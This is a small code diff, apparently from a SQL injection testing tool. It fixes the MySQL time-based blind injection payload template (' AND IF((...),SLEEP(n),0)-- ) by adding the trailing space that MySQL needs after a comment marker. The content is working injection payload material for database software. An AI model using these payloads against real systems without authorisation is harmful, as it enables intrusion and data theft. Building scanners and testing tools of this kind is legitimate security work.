@@ -11,7 +11,7 @@ from .contracts import PayloadBuilder
 # context and DBMS_LOCK.SLEEP needs a grant that often isn't available --
 # both are more fragile and are left for a future phase.
 _DIALECT_TEMPLATES: dict[str, tuple[str, str]] = {
-    "mysql": ("' AND IF((", "),SLEEP({sleep_seconds}),0)--"),
+    "mysql": ("' AND IF((", "),SLEEP({sleep_seconds}),0)-- "),
     # Concatenation (`||`), not `AND`: `pg_sleep()` returns void, which
     # cannot be used as the right-hand side of a boolean AND, and even where
     # Postgres tolerated that, the WHERE clause's own row filter can make it
@@ -37,7 +37,7 @@ class TimePayloadBuilder(PayloadBuilder):
 
     sleep_seconds: float
     prefix: str = "' AND IF(("
-    suffix: str = "),SLEEP({sleep_seconds}),0)--"
+    suffix: str = "),SLEEP({sleep_seconds}),0)-- "
 
     def __post_init__(self) -> None:
         if self.sleep_seconds <= 0:
